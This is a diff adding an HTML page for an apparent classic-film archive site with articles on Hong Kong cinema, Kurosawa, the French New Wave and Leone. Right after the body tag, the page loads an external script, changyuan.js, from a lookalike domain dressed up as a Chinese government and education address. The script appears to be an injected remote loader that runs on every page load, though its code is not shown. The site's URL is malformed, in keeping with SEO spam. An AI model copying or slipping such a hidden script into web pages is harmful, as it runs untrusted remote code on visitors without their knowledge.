@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>三九电影网 - 经典电影档案与影史回顾</title>
+    <meta name="description" content="三九电影网(sanjiudianyingwang-top)专注经典电影档案整理、影史回顾与老片推荐，带你重温那些值得反复观看的银幕佳作。">
+    <meta name="keywords" content="三九电影网, sanjiudianyingwang-top, 经典电影, 影史回顾, 老片推荐, 电影档案">
+    <meta name="author" content="三九电影网">
+    <meta name="robots" content="index,follow">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #faf7f2;
+            color: #2c2c2c;
+            line-height: 1.8;
+            font-family: "Noto Serif SC", "Source Han Serif SC", "SimSun", "Georgia", serif;
+        }
+        a { text-decoration: none; color: #8b4513; }
+        a:hover { color: #a0522d; }
+        .wrap { width: 100%; max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+
+        /* 报头 */
+        .masthead {
+            text-align: center;
+            padding: 36px 0 24px;
+            border-bottom: 3px double #2c2c2c;
+            margin-bottom: 0;
+        }
+        .masthead .volume {
+            font-size: 12px; letter-spacing: 4px; color: #8b7355;
+            text-transform: uppercase; margin-bottom: 8px;
+        }
+        .masthead h1 {
+            font-size: 48px; font-weight: 900; color: #1a1a1a;
+            letter-spacing: 8px; line-height: 1.1;
+        }
+        .masthead h1 span { color: #8b4513; }
+        .masthead .meta {
+            font-size: 13px; color: #8b7355; margin-top: 10px;
+            border-top: 1px solid #d4c9b8; border-bottom: 1px solid #d4c9b8;
+            padding: 6px 0; letter-spacing: 2px;
+        }
+
+        /* 导航 */
+        nav {
+            background: #faf7f2; border-bottom: 1px solid #d4c9b8;
+            position: sticky; top: 0; z-index: 999;
+        }
+        nav ul {
+            display: flex; justify-content: center; gap: 0;
+            list-style: none; max-width: 800px; margin: 0 auto;
+        }
+        nav ul li { border-right: 1px solid #d4c9b8; }
+        nav ul li:last-child { border-right: none; }
+        nav ul li a {
+            display: block; padding: 12px 28px;
+            font-size: 15px; font-weight: 700; color: #4a4a4a;
+            letter-spacing: 1px; transition: .2s;
+        }
+        nav ul li a:hover { background: #f0ebe1; color: #8b4513; }
+
+        /* 首屏 */
+        .lede {
+            padding: 40px 0 30px;
+            border-bottom: 2px solid #2c2c2c;
+        }
+        .lede-inner {
+            max-width: 800px; margin: 0 auto; text-align: center;
+        }
+        .lede-label {
+            font-size: 12px; letter-spacing: 3px; color: #8b4513;
+            font-weight: 700; margin-bottom: 14px; display: block;
+        }
+        .lede h2 {
+            font-size: 32px; font-weight: 900; color: #1a1a1a;
+            line-height: 1.4; margin-bottom: 14px;
+        }
+        .lede p {
+            font-size: 17px; color: #555; max-width: 680px; margin: 0 auto 22px;
+            text-align: justify; text-align-last: center;
+        }
+        .lede-url {
+            display: inline-block; border: 2px solid #8b4513; color: #8b4513;
+            padding: 10px 28px; font-weight: 700; font-size: 14px;
+            letter-spacing: 1px; transition: .3s;
+        }
+        .lede-url:hover { background: #8b4513; color: #faf7f2; }
+
+        /* 栏目 */
+        section { padding: 44px 0; }
+        .section-title {
+            text-align: center; margin-bottom: 32px;
+        }
+        .section-title .num {
+            font-size: 13px; color: #8b7355; letter-spacing: 2px;
+            display: block; margin-bottom: 4px;
+        }
+        .section-title h2 {
+            font-size: 26px; font-weight: 900; color: #1a1a1a;
+            letter-spacing: 4px;
+        }
+        .section-title .line {
+            width: 60px; height: 2px; background: #8b4513;
+            margin: 10px auto 0;
+        }
+
+        /* 双栏布局 */
+        .two-col {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 32px;
+        }
+        .article {
+            border: 1px solid #d4c9b8; padding: 24px;
+            background: #fffdf8; transition: .3s;
+        }
+        .article:hover { box-shadow: 0 4px 16px rgba(139,69,19,0.1); }
+        .article .art-num {
+            font-size: 11px; color: #8b4513; font-weight: 700;
+            letter-spacing: 2px; margin-bottom: 8px; display: block;
+        }
+        .article h3 {
+            font-size: 19px; font-weight: 900; color: #1a1a1a;
+            margin-bottom: 10px; line-height: 1.4;
+            border-bottom: 1px solid #d4c9b8; padding-bottom: 10px;
+        }
+        .article p { font-size: 14px; color: #555; text-align: justify; }
+        .article .art-meta {
+            font-size: 12px; color: #8b7355; margin-top: 12px;
+            padding-top: 10px; border-top: 1px dashed #d4c9b8;
+        }
+
+        /* 经典档案 - 竖排列表 */
+        .archive {
+            max-width: 800px; margin: 0 auto;
+        }
+        .archive-item {
+            display: flex; align-items: baseline; gap: 16px;
+            padding: 16px 0; border-bottom: 1px solid #d4c9b8;
+            transition: .2s;
+        }
+        .archive-item:hover { background: #f0ebe1; padding-left: 12px; }
+        .archive-year {
+            font-size: 14px; font-weight: 700; color: #8b4513;
+            min-width: 50px; flex-shrink: 0;
+        }
+        .archive-item h3 {
+            font-size: 16px; font-weight: 700; color: #2c2c2c; flex: 1;
+        }
+        .archive-item .archive-tag {
+            font-size: 11px; color: #8b7355; border: 1px solid #d4c9b8;
+            padding: 2px 8px; flex-shrink: 0;
+        }
+
+        /* 影评摘录 */
+        .quotes {
+            max-width: 760px; margin: 0 auto;
+        }
+        .quote {
+            border-left: 4px solid #8b4513; padding: 18px 22px;
+            margin-bottom: 20px; background: #fffdf8;
+            border-right: 1px solid #d4c9b8;
+            border-top: 1px solid #d4c9b8;
+            border-bottom: 1px solid #d4c9b8;
+        }
+        .quote p {
+            font-size: 16px; color: #2c2c2c; font-style: italic;
+            margin-bottom: 8px; text-align: justify;
+        }
+        .quote .author {
+            font-size: 13px; color: #8b7355; font-style: normal;
+            text-align: right; display: block;
+        }
+
+        /* 关于 */
+        .about {
+            max-width: 760px; margin: 0 auto; text-align: center;
+            border: 2px solid #2c2c2c; padding: 40px;
+            background: #fffdf8;
+        }
+        .about .about-mark {
+            font-size: 36px; display: block; margin-bottom: 12px;
+        }
+        .about h3 {
+            font-size: 22px; font-weight: 900; color: #1a1a1a;
+            margin-bottom: 16px; letter-spacing: 2px;
+        }
+        .about p {
+            font-size: 15px; color: #555; margin-bottom: 12px;
+            text-align: justify; text-align-last: center;
+        }
+        .about .site-name {
+            font-size: 18px; font-weight: 900; color: #8b4513;
+            margin: 20px 0 6px; letter-spacing: 1px;
+        }
+        .about .site-url {
+            display: inline-block; border: 1px solid #8b4513; color: #8b4513;
+            padding: 8px 20px; font-weight: 700; font-size: 14px;
+        }
+
+        footer {
+            background: #1a1a1a; color: #a09482; text-align: center;
+            padding: 28px 0; font-size: 13px; border-top: 4px double #8b4513;
+        }
+        footer a { color: #d4c9b8; }
+
+        @media (max-width: 900px) {
+            .two-col { grid-template-columns: 1fr; }
+        }
+        @media (max-width: 600px) {
+            .masthead h1 { font-size: 28px; letter-spacing: 4px; }
+            nav ul { flex-wrap: wrap; }
+            nav ul li { border-right: none; border-bottom: 1px solid #d4c9b8; }
+            nav ul li a { padding: 10px 16px; font-size: 14px; }
+            .lede h2 { font-size: 22px; }
+            .archive-item { flex-direction: column; gap: 4px; }
+            .archive-item h3 { font-size: 15px; }
+            .about { padding: 24px 16px; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="masthead">
+    <div class="wrap">
+        <div class="volume">EST. 2024 · VOL.39</div>
+        <h1>三九<span>电影网</span></h1>
+        <div class="meta">每日经典 · 影史回顾 · 老片推荐 · 电影档案</div>
+    </div>
+</div>
+
+<nav>
+    <ul>
+        <li><a href="#home">首页</a></li>
+        <li><a href="#feature">专题文章</a></li>
+        <li><a href="#archive">经典档案</a></li>
+        <li><a href="#quote">影评摘录</a></li>
+        <li><a href="#about">关于本站</a></li>
+    </ul>
+</nav>
+
+<section id="home" class="lede">
+    <div class="wrap lede-inner">
+        <span class="lede-label">— 本期导读 —</span>
+        <h2>重温银幕经典，在老胶片里寻找永恒的光影记忆</h2>
+        <p>三九电影网专注整理影史经典、老片推荐与电影档案。我们相信好电影经得起时间考验，每一部经典都值得被重新发现。在这里，我们带你回到那些改变电影史的瞬间。</p>
+        <a class="lede-url" href="https://sanjiudianyingwang-top">https://sanjiudianyingwang-top</a>
+    </div>
+</section>
+
+<section id="feature">
+    <div class="wrap">
+        <div class="section-title">
+            <span class="num">FEATURES</span>
+            <h2>专题文章</h2>
+            <div class="line"></div>
+        </div>
+        <div class="two-col">
+            <div class="article">
+                <span class="art-num">NO.01</span>
+                <h3>香港电影的黄金十年：1986—1996</h3>
+                <p>从吴宇森的暴力美学到王家卫的都市迷离，从周星驰的无厘头到陈可辛的细腻人情——这十年是香港电影最璀璨的篇章，产量惊人、类型丰富、人才辈出，至今无人超越。</p>
+                <div class="art-meta">文 / 编辑部 · 阅读约 5 分钟</div>
+            </div>
+            <div class="article">
+                <span class="art-num">NO.02</span>
+                <h3>黑泽明：用镜头写诗的武士</h3>
+                <p>从《罗生门》的叙事迷宫到《七武士》的史诗格局，黑泽明不仅定义了日本电影的国际形象，更影响了从卢卡斯到斯皮尔伯格的整整一代好莱坞导演。</p>
+                <div class="art-meta">文 / 编辑部 · 阅读约 4 分钟</div>
+            </div>
+            <div class="article">
+                <span class="art-num">NO.03</span>
+                <h3>法国新浪潮：一场电影美学的革命</h3>
+                <p>戈达尔、特吕弗、夏布洛尔——这群年轻人用肩扛摄影机和即兴创作，打破了好莱坞的叙事规则，让电影从工业产品变成了个人表达的艺术。</p>
+                <div class="art-meta">文 / 编辑部 · 阅读约 6 分钟</div>
+            </div>
+            <div class="article">
+                <span class="art-num">NO.04</span>
+                <h3>意大利西部片：莱昂内的美国梦</h3>
+                <p>赛尔乔·莱昂内用三部曲重新定义了西部片。荒凉的沙漠、极近的特写、莫里康内的口哨——他拍的不是美国西部，而是关于美国的神话。</p>
+                <div class="art-meta">文 / 编辑部 · 阅读约 4 分钟</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="archive" style="background: #f0ebe1;">
+    <div class="wrap">
+        <div class="section-title">
+            <span class="num">ARCHIVE</span>
+            <h2>经典档案</h2>
+            <div class="line"></div>
+        </div>
+        <div class="archive">
+            <div class="archive-item">
+                <div class="archive-year">1994</div>
+                <h3>肖申克的救赎 — 希望是件好东西</h3>
+                <div class="archive-tag">剧情</div>
+            </div>
+            <div class="archive-item">
+                <div class="archive-year">1954</div>
+                <h3>七武士 — 黑泽明的史诗范本</h3>
+                <div class="archive-tag">动作</div>
+            </div>
+            <div class="archive-item">
+                <div class="archive-year">1972</div>
+                <h3>教父 — 科波拉的家族史诗</h3>
+                <div class="archive-tag">犯罪</div>
+            </div>
+            <div class="archive-item">
+                <div class="archive-year">1982</div>
+                <h3>银翼杀手 — 赛博朋克的起点</h3>
+                <div class="archive-tag">科幻</div>
+            </div>
+            <div class="archive-item">
+                <div class="archive-year">2001</div>
+                <h3>千与千寻 — 宫崎骏的奇幻世界</h3>
+                <div class="archive-tag">动画</div>
+            </div>
+            <div class="archive-item">
+                <div class="archive-year">1957</div>
+                <h3>十二怒汉 — 密闭空间的心理博弈</h3>
+                <div class="archive-tag">悬疑</div>
+            </div>
+            <div class="archive-item">
+                <div class="archive-year">1997</div>
+                <h3>美丽人生 — 用笑声对抗黑暗</h3>
+                <div class="archive-tag">剧情</div>
+            </div>
+            <div class="archive-item">
+                <div class="archive-year">1960</div>
+                <h3>惊魂记 — 希区柯克的浴室尖叫</h3>
+                <div class="archive-tag">惊悚</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="quote">
+    <div class="wrap">
+        <div class="section-title">
+            <span class="num">REVIEWS</span>
+            <h2>影评摘录</h2>
+            <div class="line"></div>
+        </div>
+        <div class="quotes">
+            <div class="quote">
+                <p>"电影是生活的渐近线。它永远无法完全复制生活，但它可以无限接近那些我们无法言说的瞬间。"</p>
+                <span class="author">— 摘自《电影手册》评论</span>
+            </div>
+            <div class="quote">
+                <p>"每一部经典电影都是一面镜子，你二十岁时看到的是勇气，四十岁时看到的可能是遗憾。"</p>
+                <span class="author">— 摘自编辑手记</span>
+            </div>
+            <div class="quote">
+                <p>"好电影不是让你忘记现实，而是让你带着新的眼睛回到现实。"</p>
+                <span class="author">— 摘自读者来信</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="about" style="background: #f0ebe1;">
+    <div class="wrap">
+        <div class="section-title">
+            <span class="num">ABOUT</span>
+            <h2>关于本站</h2>
+            <div class="line"></div>
+        </div>
+        <div class="about">
+            <span class="about-mark">🎬</span>
+            <h3>三九电影网</h3>
+            <p><b>三九电影网</b> 是一个以"经典电影档案"为核心的推荐与资料站点。我们整理影史回顾、老片推荐、导演专题和影评摘要，致力于让更多好电影被看见。</p>
+            <p>本站不提供盗版播放，不转载未授权正片资源，所有内容仅供电影资料检索与学习交流。</p>
+            <div class="site-name">网站名称：三九电影网</div>
+            <div class="site-url">https://sanjiudianyingwang-top</div>
+            <p style="margin-top:16px;font-size:12px;color:#8b7355;">关键词：三九电影网、sanjiudianyingwang-top、经典电影、影史回顾、老片推荐</p>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        © 2024 三九电影网 · https://sanjiudianyingwang-top ｜ 单页展示站点，仅供电影资料检索与学习交流
+    </div>
+</footer>
+
+</body>
+</html>
